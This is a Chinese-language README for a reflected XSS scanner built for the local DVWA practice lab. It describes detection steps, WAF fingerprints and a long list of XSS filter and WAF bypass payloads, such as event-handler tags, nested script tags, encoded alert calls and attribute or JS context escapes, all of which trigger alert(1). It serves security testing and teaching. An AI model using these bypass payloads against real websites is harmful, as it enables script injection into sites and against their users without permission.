# 反射型 XSS 检测工具

仅用于**已授权**的测试环境（本工具默认针对本地 DVWA 靶场 `http://127.0.0.1/vulnerabilities/xss_r/`）。
判定成功的唯一标准：真实浏览器中弹出 `alert()` 弹窗。工具只发 GET/POST 读请求，不做任何写入或破坏性操作。

---

## 0. 图形界面（像素风）

```bash
python webui.py            # 自动打开 http://127.0.0.1:8848/
# 或双击 启动界面.bat
```

纯标准库实现（`http.server`），零依赖。界面包含：

- **任务设定**面板：目标 / Cookie / 参数 / 方法 / 单发 payload / 跳过浏览器验证
- **查克拉链路**：实时日志终端（info/ok/warn/error 分级着色）+ 进度条
- **影之向导**：像素忍者吉祥物，随扫描状态待机 / 结印 / 成功 / 失手
- **战报**：结论横幅、上下文/字符存活/WAF/弹窗验证 状态徽章、载荷尝试表、绕过命中表、PoC 一键复制与「浏览器打开（真实弹窗）」

前后端约定：`POST /api/scan` 建任务 → `GET /api/poll?job=&cursor=` 增量拉日志与结果。

**出问题先点「环境自检 / DIAGNOSE」**（`POST /api/diag`）：会逐项检查 Python 版本、目标连通性（HTTP 状态 / 页面标题 / 是否被踢回登录页）、playwright/selenium 是否安装、Chromium 内核是否就位，并把结果直接打进日志终端。

常见报错对照：

| 现象 | 原因 | 处理 |
|---|---|---|
| `Chromium 未安装…` | playwright 装了但内核没下 | `python -m playwright install chromium` |
| 页面打不开 / 连接被拒 | 端口被占用或服务没起来 | 换 `--port 9000`；看控制台报错 |
| 扫描卡住不动 | 目标不可达（DVWA 没启动） | 先跑 `python probe.py` |
| 结论「无反射」 | Cookie 失效被踢回登录页 | 重新登录 DVWA 取新 PHPSESSID |
| 不想装浏览器 | — | 勾选「跳过浏览器验证」，静态判定同样出结论 |

---

## 1. 快速开始

```bash
# 全自动检测（含浏览器弹窗验证）
python xss_scanner.py

# 不装浏览器也能跑（只做静态判定）
python xss_scanner.py --no-browser

# 指定参数 / 方法
python xss_scanner.py --param name --method GET

# 只验证一个已知 payload 是否能弹窗
python xss_scanner.py --payload "<script>alert(1)</script>" --verify-only

# 走代理抓包（Burp）
python xss_scanner.py --proxy http://127.0.0.1:8080
```

默认参数：

| 项 | 默认值 |
|---|---|
| 目标 | `http://127.0.0.1/vulnerabilities/xss_r/` |
| Cookie | `PHPSESSID=pio9vir55opk5pi13vvr61m6k0; security=low` |
| 输出 | `xss_report.json`、`poc.txt` |

浏览器验证需要其中之一：

```bash
pip install playwright && python -m playwright install chromium
# 或
pip install selenium   # 需本机有 Chrome + 对应 chromedriver
```

---

## 2. 检测流程（工具做了什么）

1. **连通性 / 会话校验** —— 访问目标，确认 Cookie 有效、未跳登录页。
2. **参数识别** —— 从页面 `<form>` 自动提取 `action / method / input name`（DVWA 为 `name`，GET）。
3. **反射点检测** —— 发送随机 token，判断参数值是否回显到响应。
4. **上下文判定** —— 一个小型状态机扫描反射点前的 HTML：判断落在
   - `html`（正文） / `attr_dq`（双引号属性内） / `attr_sq`（单引号属性内） / `tag`（标签内无引号） / `js`（`<script>` 内）。
   不同上下文用不同 payload 集。
5. **特殊字符存活分析** —— 发送 `zqA<q>"w'e/r(t)yzqB`，看 `< > " ' / ( )` 是否被实体编码/删除，决定可用的绕过方向。
6. **WAF / 过滤检测** —— 对比基线请求与攻击请求的状态码、响应长度、响应体/响应头特征。
7. **上下文匹配 payload 注入** —— 逐个发送并判定：`原样反射` / `被实体编码` / `被拦截` / `未反射`。
8. **绕过尝试** —— 疑似 WAF/过滤时，自动跑一张绕过矩阵（见第 4 节）。
9. **浏览器验证** —— Playwright/Selenium 无头浏览器带 Cookie 打开 PoC URL，监听 `dialog` 事件，捕获到 `alert` 即判定成功。
10. **输出** —— 报告 JSON + 可直接复现的 PoC URL。

---

## 3. DVWA 各安全等级的预期结果

| security | 服务端处理 | 可直接弹窗的 payload |
|---|---|---|
| low | 无过滤 | `<script>alert(1)</script>` |
| medium | `str_replace('<script>','',...)`（区分大小写、仅小写） | `<ScRiPt>alert(1)</scRiPt>` 或 `<img src=x onerror=alert(1)>` |
| high | `preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i','',...)` | `<img src=x onerror=alert(1)>`（不含 `script` 字样） |

> 注意：`security` 存储在 Cookie 中，切换等级后必须重新点击 DVWA 的 *Set Security Level*，否则服务端读的是会话里的值。

---

## 4. 有防火墙时的绕过分析方式

工具会先给出**证据**，再按下面的方向尝试。分析逻辑：

### 4.1 先判断"是不是 WAF"

| 现象 | 含义 |
|---|---|
| 攻击请求返回 403/406/419/429/501/503，基线正常 | 关键字/规则拦截 |
| 响应体出现 `ModSecurity`、`Request blocked`、`安全狗`、`拦截`、`Cloudflare` 等 | 已知 WAF 指纹 |
| 响应头出现 `cf-ray`、`x-sucuri-id`、`x-waf` | 已知 WAF 指纹 |
| 攻击响应长度骤降（几百字节的错误页） | 拦截页 |
| 只过滤特定字符（`<` 变 `&lt;`） | 不是 WAF，是应用层过滤/转义 |

### 4.2 绕过方向（按优先级）

1. **换标签，避开 `script` 关键字**
   - `<img src=x onerror=alert(1)>`
   - `<svg onload=alert(1)>`
   - `<details open ontoggle=alert(1)>`
   - `<body onload=alert(1)>`
   - `<video><source onerror=alert(1)>`

2. **大小写与标签嵌套**（针对"删一次 `<script>`"的实现缺陷）
   - `<ScRiPt>alert(1)</ScRiPt>`
   - `<scr<script>ipt>alert(1)</script>` — 删掉中间的 `<script>` 后正好拼回 `<script>`

3. **字符编码 / 实体化**（针对关键字黑名单）
   - 十进制实体：`<img src=x onerror=&#97;lert(1)>`
   - 十六进制实体：`<img src=x onerror=&#x61;lert(1)>`
   - JS Unicode 转义：`<script>alert(1)</script>`
   - 隐藏 alert 关键字：`<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`（`alert(1)` 的 Base64）

4. **分隔符替换**（针对空格/属性名规则）
   - `<img\tsrc=x\tonerror=alert(1)>`（TAB）
   - `<img\nsrc=x\nonerror=alert(1)>`（换行）
   - `<img/src=x/onerror=alert(1)>`（斜杠）

5. **拼接调用**（针对 `alert(` 关键字）
   - `<script>window['al'+'ert'](1)</script>`
   - `<svg onload=alert\`1\`>`（模板字符串，无括号）

6. **上下文逃逸**（当反射落在属性或 JS 里）
   - 双引号属性：`"><svg onload=alert(1)>`
   - 单引号属性：`'><svg onload=alert(1)>`
   - JS 字符串：`';alert(1);//` 或 `</script><script>alert(1)</script>`

7. **编码层加固**
   - 整段 URL 二次编码（`%253Cscript%253E...`），针对会"解码一次再做黑名单"的 WAF
   - 手动丢给 Burp 的 *Decoder* 反复编码测试

### 4.3 判断绕过是否成功

不看状态码，看**反射形态**：

- payload **原样**出现在响应中 → 极易执行（进浏览器验证）
- 出现 `&lt;script&gt;` / `&#60;` → 已被输出转义，此路不通，换上下文或换标签
- 出现空字符串/截断 → 被删除，尝试嵌套打断或双写

工具的 `--no-browser` 模式会给出静态判定；能弹窗的最终以浏览器 `dialog` 事件为准。

---

## 5. 输出物

- 控制台：分 9 步的过程日志
- `xss_report.json`：完整结构化结果（上下文、字符存活、WAF 证据、每个 payload 的判定、浏览器弹窗消息）
- `poc.txt`：最终 PoC URL 与 payload

---

## 6. 免责声明

本工具仅用于你自己拥有或已获书面授权的系统（如本地 DVWA）。对未授权目标使用属于违法行为。
